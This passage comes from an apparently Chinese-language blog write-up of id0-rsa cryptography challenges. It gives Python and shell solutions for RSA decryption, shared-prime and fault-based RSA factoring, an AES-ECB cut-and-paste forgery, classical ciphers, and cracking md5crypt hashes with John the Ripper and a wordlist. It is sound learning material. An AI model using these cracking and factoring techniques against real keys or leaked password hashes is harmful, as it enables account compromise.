class="number">0x6794893f3c47247262e95fbed846e1a623fc67b1dd96e13c7f9fc3b880642e42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(pow(c,d,n))</span><br><span class="line"><span class="string">'0x310f2eb0634ed1ab'</span></span><br></pre></td></tr></table></figure><h2 id="一行"><a href="#一行" class="headerlink" title="一行"></a>一行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root@kali:~/Documents/id0-rsa/Hello_OpenSSL<span class="comment"># openssl rsautl -decrypt -in &lt;(xxd -r -p cipher) -inkey priva.pem -raw | xxd -p -c 8 | tail -n1</span></span><br><span class="line"><span class="comment"># 310f2eb0634ed1ab</span></span><br></pre></td></tr></table></figure><h1 id="Intro-to-RSA"><a href="#Intro-to-RSA" class="headerlink" title="Intro to RSA"></a>Intro to RSA</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(e, N) = (<span class="number">0x3</span>, <span class="number">0x64ac4671cb4401e906cd273a2ecbc679f55b879f0ecb25eefcb377ac724ee3b1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = <span class="number">0x431d844bdcd801460488c4d17487d9a5ccc95698301d6ab2e218e4b575d52ea3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="number">0x599f55a1b0520a19233c169b8c339f10695f9e61c92bd8fd3c17c8bba0d5677e</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(pow(c,d,N))</span><br><span class="line"><span class="string">'0x4d801868d894740b2be29309fcd3edcd51bd2c2a685028b89290f9268c727581'</span></span><br></pre></td></tr></table></figure><h1 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h1><img src="/id0-rsa-WP合集/1524188467870.png" title="Caesar"><p>但是交了以后就显示错误，不知道为什么……</p><hr><p>破案了，因为凯撒之后的原文是</p><img src="/id0-rsa-WP合集/1525509896561.png" title="Caesar_solution"><h1 id="Hello-Bitcoin"><a href="#Hello-Bitcoin" class="headerlink" title="Hello Bitcoin"></a>Hello Bitcoin</h1><p>按资料算就是了</p><p>然而我找到了在线计算的<a href="http://gobittest.appspot.com/PrivateKey" target="_blank" rel="noopener">工具</a>;D</p><p>按照比特币wiki的说法，计算过程大概是这样的：</p><ol><li>首先我们生成一个私钥</li><li>获取对应的公钥</li><li>获得公钥的SHA256散列值</li><li>获取上一步结果的RIPEMD-160散列值</li><li>在散列值前加入版本号</li><li>计算上一步结果的SHA-256散列</li><li>取第二个SHA-256散列值的前四字节作为地址校验和</li><li>在第四步的结果末尾加入校验和</li><li>进行Base28编码</li></ol><p><code>You already solved this one! Solution:  18GZRs5nx8sVhF1xVAaEjKrYJga4hMbYc2</code></p><h1 id="Ps-and-Qs"><a href="#Ps-and-Qs" class="headerlink" title="Ps and Qs"></a>Ps and Qs</h1><p>factordb.com 完成 </p><p>噫，年老体衰也就算了，眼神也不好了，其实没有分解成功</p><p>然后开了个yafu，结果还是很不错的，我做出来了以后依然没有分解出答案</p><p>先是打开题目看了下，说是生成的素数<code>low entropy</code>(低熵)吗，然后打开论文大概看了下，就说生成素数有毛病，就猜测是不是共同素数的锅</p><p>结果还真是</p><img src="/id0-rsa-WP合集/1524830782157.png" title="Ps and Qs1"><p>先读两个公钥，然后gcd了一波，成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line"><span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> gcd(b, a%b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#q = gcd(3367646059138877442579820972831876412006279917097809082279412851693123955964282545145500497393579598954859534731890460229194372339215098506788375050698427369, 9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141)</span></span><br><span class="line"><span class="comment">#print(q)</span></span><br></pre></td></tr></table></figure><p>然后懒得写求拓展欧几里得求逆元了，直接拿工具了</p><img src="/id0-rsa-WP合集/1524830884875.png" title="Ps and Qs2"><p>补全代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line"><span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> gcd(b, a%b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#q = gcd(3367646059138877442579820972831876412006279917097809082279412851693123955964282545145500497393579598954859534731890460229194372339215098506788375050698427369, 9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141)</span></span><br><span class="line"><span class="comment">#print(q)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141//q)</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141</span></span><br><span class="line"></span><br><span class="line">d = <span class="number">5595429548525262877923879998920954875376781621351655927785581040054379710925982991727871918848397312612397095534700830662119225899345003601005897300178945</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">0xf5ed9da29d8d260f22657e091f34eb930bc42f26f1e023f863ba13bee39071d1ea988ca62b9ad59d4f234fa7d682e22ce3194bbe5b801df3bd976db06b944da</span></span><br><span class="line"></span><br><span class="line">print(hex(pow(c,d,n))[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># f6a1df363229c6ec</span></span><br></pre></td></tr></table></figure><h1 id="Affine-Cipher"><a href="#Affine-Cipher" class="headerlink" title="Affine Cipher"></a>Affine Cipher</h1><p>暴力一下肉眼看吧</p><p>是的，暴力以后搜索THE，出现次数最多的那个基本就确定了</p><p>不过得感叹一下 ……自己越来越蠢了……求个逆元，不是a*b%c==1则mod c下ab互为逆元么，我™a的b次方是要闹哪样……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line">plain = <span class="string">"BOHHIKBI,OZ,REI,WZRIKZIR,EX.,BOHI,RO,KISU,XSHO.R,ICBSG.WYISU,OZ, WZXZBWXS,WZ.RWRGRWOZ.,.IKYWZP,X.RKG.RIT,REWKT,DXKRWI.,RO,DKOBI..,ISIBRKOZWB,DXUHIZR.F,NEWSI,REI,.U.RIH,NOKA.,NISS,IZOGPE, OKHO.R,RKXZ.XBRWOZ.Q,WR,.RWSS,.G  IK., KOH,REI,WZEIKIZR,NIXAZI..I.,O ,REI,RKG.R,MX.IT,HOTISF,BOHDSIRISU,ZOZKIYIK.WMSI,RKXZ.XBRWOZ.,XKI,ZOR,KIXSSU,DO..WMSIQ,.WZBI, WZXZBWXS,WZ.RWRGRWOZ.,BXZZORXYOWT,HITWXRWZP,TW.DGRI.F,REI,BO.R,O ,HITWXRWOZ,WZBKIX.I.,RKXZ.XBRWOZ,BO.R.Q,SWHWRWZP,REIHWZWHGH,DKXBRWBXS,RKXZ.XBRWOZ,.WJI,XZT,BGRRWZP,O  ,REI,DO..WMWSWRU, OK,.HXSS,BX.GXS,RKXZ.XBRWOZ.QXZT,REIKI,W.,X,MKOXTIK,BO.R,WZ,REI,SO..,O ,XMWSWRU,RO,HXAI,ZOZKIYIK.WMSI,DXUHIZR., OK,ZOZKIYIK.WMSI.IKYWBI.F,NWRE,REI,DO..WMWSWRU,O ,KIYIK.XSQ,REI,ZIIT, OK,RKG.R,.DKIXT.F,HIKBEXZR.,HG.RMI,NXKU,O ,REIWK,BG.ROHIK.Q,EX..SWZP,REIH, OK,HOKI,WZ OKHXRWOZ,REXZ,REIU,NOGST,OREIKNW.I,ZIITF,X,BIKRXWZ,DIKBIZRXPI,O , KXGT,W.,XBBIDRIT,X.,GZXYOWTXMSIF,REI.I,BO.R.,XZT,DXUHIZR,GZBIKRXWZRWI.BXZ,MI,XYOWTIT,WZ,DIK.OZ,MU,G.WZP,DEU.WBXS,BGKKIZBUQ,MGR,ZO,HIBEXZW.H,ICW.R.,RO,HXAI,DXUHIZR.OYIK,X,BOHHGZWBXRWOZ.,BEXZZIS,NWREOGR,X,RKG.RIT,DXKRUF"</span></span><br><span class="line">mp = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ ,."</span></span><br><span class="line">dict = &#123;&#125;</span><br><span class="line">inv_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(mp)):</span><br><span class="line">    dict[i] = mp[i]</span><br><span class="line">    dict[mp[i]] = i</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(dict)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">29</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">29</span>):</span><br><span class="line">        <span class="keyword">if</span> i*j%<span class="number">29</span> == <span class="number">1</span>:</span><br><span class="line">            inv_dict[i] = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(inv_dict)</span><br><span class="line"></span><br><span class="line">newarr = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(plain)):</span><br><span class="line">    newarr.append(dict[plain[i]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(newarr)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decry</span><span class="params">(c, a, b)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(c)):</span><br><span class="line">        s += dict[(c[i]-b+<span class="number">29</span>)*inv_dict[a]%<span class="number">29</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">29</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">29</span>):</span><br><span class="line">        print(decry(newarr, i, j))</span><br><span class="line">        print(i, j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">29</span>):</span><br><span class="line">    print(decry(newarr, <span class="number">0</span>, j))</span><br><span class="line">    print(<span class="number">0</span>, j)</span><br><span class="line"></span><br><span class="line"><span class="comment"># plain = "RLZZC SCIZJB"</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># newarr = []</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for i in range(0, len(plain)):</span></span><br><span class="line"><span class="comment">#     newarr.append(dict[plain[i]])</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(decry(newarr, 2, 3))</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">λ python</span><br><span class="line">Python <span class="number">3.6</span><span class="number">.1</span> on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>plain = <span class="string">"COMMERCE ON THE INTERNET HAS COME TO RELY ALMOST EXCLUSIVELY ON FINANCIAL INSTITUTIONS SERVING ASTRUSTED THIRD PARTIES TO PROCESS ELECTRONIC PAYMENTS. WHILE THE SYSTEM WORKS WELL ENOUGH FORMOST TRANSACTIONS, IT STILL SUFFERS FROM THE INHERENT WEAKNESSES OF THE TRUST BASED MODEL. COMPLETELY NONREVERSIBLE TRANSACTIONS ARE NOT REALLY POSSIBLE, SINCE FINANCIAL INSTITUTIONS CANNOTAVOID MEDIATING DISPUTES. THE COST OF MEDIATION INCREASES TRANSACTION COSTS, LIMITING THEMINIMUM PRACTICAL TRANSACTION SIZE AND CUTTING OFF THE POSSIBILITY FOR SMALL CASUAL TRANSACTIONS,AND THERE IS A BROADER COST IN THE LOSS OF ABILITY TO MAKE NONREVERSIBLE PAYMENTS FOR NONREVERSIBLESERVICES. WITH THE POSSIBILITY OF REVERSAL, THE NEED FOR TRUST SPREADS. MERCHANTS MUSTBE WARY OF THEIR CUSTOMERS, HASSLING THEM FOR MORE INFORMATION THAN THEY WOULD OTHERWISE NEED. A CERTAIN PERCENTAGE OF FRAUD IS ACCEPTED AS UNAVOIDABLE. THESE COSTS AND PAYMENT UNCERTAINTIESCAN BE AVOIDED IN PERSON BY USING PHYSICAL CURRENCY, BUT NO MECHANISM EXISTS TO MAKE PAYMENTSOVER A COMMUNICATIONS CHANNEL WITHOUT A TRUSTED PARTY."</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.md5(plain.encode()).hexdigest()</span><br><span class="line"><span class="string">'880cabd53df2f03050a7214d3ae30a07'</span></span><br></pre></td></tr></table></figure><h1 id="Cut-and-Paste-Attack-On-AES-ECB"><a href="#Cut-and-Paste-Attack-On-AES-ECB" class="headerlink" title="Cut and Paste Attack On AES-ECB"></a>Cut and Paste Attack On AES-ECB</h1><p>截取一哈就行</p><p>ECB的问题就在于同样的明文总是对应相同的密文，而AES又是分组加密，所以我们只需要16字节截一段，然后从截出来的字段里拼出<code>Deposit amount: One million dollars</code>就吼啦</p><img src="/id0-rsa-WP合集/1524833328837.png" title="Cut and Paste Attack On AES-ECB"><p>然后把对应的密文组合提交就好啦</p><h1 id="Rail-Fence"><a href="#Rail-Fence" class="headerlink" title="Rail Fence"></a>Rail Fence</h1><p>栅栏密码</p><p>不是栅栏密码，丢人</p><p>就是这个名字，密码是17</p><p>然而提交又失败……是不是要加空格？？？</p><hr><p>和凯撒那题一样的问题</p><img src="/id0-rsa-WP合集/1525618734518.png" title="Rail Fence"><h1 id="Factoring-RSA-With-CRT-Optimization"><a href="#Factoring-RSA-With-CRT-Optimization" class="headerlink" title="Factoring RSA With CRT Optimization"></a>Factoring RSA With CRT Optimization</h1><p>看看论文</p><hr><p>论文结论放得挺快的，喜欢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = <span class="number">0x10001</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>n = <span class="number">0x90def3c2c91ae9bf6089ec8857960d567fdbcd7c2c3ea713046977231e65f44e1b91550971d4e5d43b51675fae4ba640add3af02dad4bf68c3ddef3a98907e1e01156de7a4474d9fce2ba8c055f44673c703a72a111a06f8a7b2fe582463938d802e91630e1e1b5483b1774e608eb4368c6bbf4da375319d9a2799bf8a5ae453</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">0xdeadc0de</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = <span class="number">0x17d7f90a4597fb2bbbb41d1a70f505f0d8c5cb53faaafea259150eb6910fb08fbf1ba40e42de70c596fb0032d132c9c6ce46c650999ad5f14a990d205984260146e2949b819dc8732beceed452701d88b2c8723b410fce739009df89930424c566af5102403981c26c3e75d9c62065a347e815b26984dcd3b5f02fc8a8092051</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> a</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gcd(pow(y,e,n)-x,n)</span><br><span class="line"><span class="number">9966524937284363425885222065976539626835093420150865305435384403545526100948308275937186399398105835105908301433416877915451315435074364352622884631548129</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = gcd(pow(y,e,n)-x,n)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q = n//p</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>n%p</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(p)</span><br><span class="line"><span class="number">9966524937284363425885222065976539626835093420150865305435384403545526100948308275937186399398105835105908301433416877915451315435074364352622884631548129</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(q)</span><br><span class="line"><span class="number">10207350221528968021374239537567355734439270587735020516681487302155761468885207397982418037573103389660473080952277752719230542349569271803978030721660851</span></span><br></pre></td></tr></table></figure><img src="/id0-rsa-WP合集/1525631225843.png" title="Factoring RSA With CRT Optimization"><h1 id="Easy-Passwords"><a href="#Easy-Passwords" class="headerlink" title="Easy Passwords"></a>Easy Passwords</h1><p>暴力/去他们推特看看</p><blockquote><p>Hint for 1: the &quot;easy&quot; passwords are all standard English words</p></blockquote><p>很惭愧，原本没思路的，又学习了一下别人怎么用John the Ripper的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># touch crackit</span></span><br><span class="line">root@kali:~<span class="comment"># john --wordlist=/usr/share/dict/words crackit </span></span><br><span class="line">Created directory: /root/.john</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"md5crypt"</span>, but the string is also recognized as <span class="string">"aix-smd5"</span></span><br><span class="line">Use the <span class="string">"--format=aix-smd5"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 10 password hashes with no different salts (md5crypt, crypt(3) <span class="variable">$1</span>$ [MD5 128/128 SSE2 4x3])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">each             (?)</span><br><span class="line"><span class="keyword">in</span>               (?)</span><br><span class="line">letter           (?)</span><br><span class="line">list             (?)</span><br><span class="line">of               (?)</span><br><span class="line">order            (?)</span><br><span class="line">second           (?)</span><br><span class="line">the              (?)</span><br><span class="line">this             (?)</span><br><span class="line">word             (?)</span><br><span class="line">10g 0:00:00:04 DONE (2018-05-07 07:53) 2.421g/s 24502p/s 24502c/s 176147C/s woolly..word<span class="string">'s</span></span><br><span class="line"><span class="string">Warning: passwords printed above might not be all those cracked</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这里直接看是不知道交什么的，id0-rsa好像都是这样做的</span></span><br><span class="line"><span class="string">root@kali:~# john --show crackit</span></span><br><span class="line"><span class="string">?:the</span></span><br><span class="line"><span class="string">?:second</span></span><br><span class="line"><span class="string">?:letter</span></span><br><span class="line"><span class="string">?:of</span></span><br><span class="line"><span class="string">?:each</span></span><br><span class="line"><span class="string">?:word</span></span><br><span class="line"><span class="string">?:in</span></span><br><span class="line"><span class="string">?:this</span></span><br><span class="line"><span class="string">?:list</span></span><br><span class="line"><span class="string">?:in</span></span><br><span class="line"><span class="string">?:order</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">11 password hashes cracked, 0 left</span></span><br></pre></td></tr></table></figure><h1 id="RSA-Modulus-Factorization"><a href="#RSA-Modulus-Factorization" class="headerlink" title="RSA Modulus Factorization"></a>RSA Modulus Factorization</h1><p>有公钥、私钥，分解N</p><p>有人提示</p><blockquote><p>You may want to look at end of section 1 of <a href="https://crypto.stanford.edu/~dabo/papers/RSA-survey.pdf" target="_blank" rel="noopener">this paper</a> to get an idea of how to tackle this.</p></blockquote><p>但是懒人选择直接用工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">λ python rsatool.py -f PEM key.pem -n <span class="number">2575379069244619122811590270693932708961682118615086945187580561953482470842235</span> <span class="number">5391264253236312033342930767629026955594380914791828872789640882880456756317355718989951748134910495292317107822354638062542536621806610548119524360577494257082085388892230653871347635789064083634194556923152378748383913055689941464591534636606264605505256200032003073128045380287795929441895659897956729518691264242454587153279087011099643014705274937963488514996712634166563179373202236856266518026166326484283485368106496495400924862033175617707157820195751946135848383888076352630565287208026865192435711425148588227314034233872575399</span> -d <span class="number">17105402368913594732268140576016021009260884834703468214454459966320267707293844817833310635571150638333054368126620841170740802501167335402566350357845884586982802288930597441429262542859551082213714762867946512961388972561696317770839625342858127315991460791480206023627821121730752214777828377914024156239192555174948311918712437146465305330571121417401154082076772433310857936602097318370602240544385942653856271345622469333448979309288295132145434251447399809135938564905989171217097472641153308592366164932415033656821923922166211242186853476413476873462490965233576571621275866183349806774845359965178419609761</span></span><br><span class="line">Using (n, d) to initialise RSA instance</span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">cc0262c3764f6d1bfa485a88c0566a6d68cb89ac382fbbc577a4862bdbce111bb59960ea787f132e3fddb9c914d0d11d156dd433a2adab9084d48cf58f58b42804805966ecd318ad19218791e14e19a8d0cf3441e219e5e1395eb5dba1fba11d94321a34eb536c51f4c44c5987e74a467b5fe2eae8d2725d63f24feebfd9ca746de93b6fd74ed82fed7dbfc3a84b0a425f52503ab71908a13ac11a9d52211042290ae2886626f67935dc78b7d86ba76d3c5e085a003dff06f914187acc368f904613cbd3d52f36c8b0535f9dfeec2737744ad8be51f66e1d470261a7fd7c6da277dbd2f213b44d9e8242a8a5b121acc8710baed3d244004e4ca560d58e756ba7</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line"></span><br><span class="line">d =</span><br><span class="line"><span class="number">87803</span>a2b0b44dbfa8e354a74b41371a2f3cce4c74f965cc85e9c1745c03bd15f2f320d8e0eb4907fd289a9a16642fff1aa4f0577ba6051a8aea12272e3600e60da0489dcf4058dc942fce337c0870841f956f6a59fd085c01f43c9d474755660f81283178d0a1ed31c98d9014a6414105657acb74c26a3316676062354a80a70335a670675f439dec08803def4892c4d99e20fbe1975d7673679ac6f16835307ce59971c865d71edeea9ed1a93c70a37e283f270dea8499271268d86f7fc4a1b4f64041833c62a057dfb0b48f1c4f6d351673238a3de3b4506eb2472aaf90b914e791c3a723464d9169d5eab8e0a3f8a42dedb065829e8b533a89dd3ba0a00a1</span><br><span class="line"></span><br><span class="line">p =</span><br><span class="line">cd8872868e62777d31e8cf8a694df3096bfa246463d4cfbda7f22f31d0b0f2d6d99996a099c79f312915018c475b2a5090f08ffa67400985dbbc8c04466ddf07414b40be264b98f8422ae053dfd53d4845eda2fda826cabb9237bb432f9e99862c6b75aeebc1b79e3a780fd813e05e73c9bbb521c05539e998031c876a2e7497</span><br><span class="line"></span><br><span class="line">q = fe1a2971eee591830144ccb525befca29aa5a84c7b63510c60a491f09a185a787250bc5ea8c024896a4ec6312a8bf391fe76e15a50d7609cfb27ac18342b7dfd3d20ed94a85d62f83454ea77aa26471881aad95c63b0e890daabc71991f8051c2ec5956f8855a13e34c1e11e3a8d9abc43d813c6f9f42e34e0c75b35d2f15371</span><br></pre></td></tr></table></figure><h1 id="Fast-Hashing-Passwords"><a href="#Fast-Hashing-Passwords" class="headerlink" title="Fast Hashing Passwords"></a>Fast Hashing Passwords</h1><p>母鸡</p><hr><p>就是给了一个简单密码表，顺着跑个散列值表，然后排序，找出散列值最大最小的两个</p><p>有点考验电脑</p><p>Python写的排序那一步会有Memory Error（主要是ACM遗留下来的习惯，写算法写cpp比较习惯）</p><p>首先是下载rockyou list，算SHA-256值（其实这里没必要，但是我觉得可能会有用，所以算一个保存着了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(strings)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(hashlib.sha256(strings).hexdigest())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">r"rockyou.txt"</span>, <span class="string">"rb"</span>)</span><br><span class="line">w = open(<span class="string">r"rawsha256.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"></span><br><span class="line">s = f.readline()[:<span class="number">-1</span>]</span><br><span class="line">arr = []</span><br><span class="line">print(hash(<span class="string">""</span>.encode()))</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> s != <span class="string">""</span>:</span><br><span class="line">    w.write(hash(s)+<span class="string">'\n'</span>)</span><br><span class="line">    arr.append(hash(s))</span><br><span class="line">    s = f.readline()[:<span class="number">-1</span>]</span><br><span 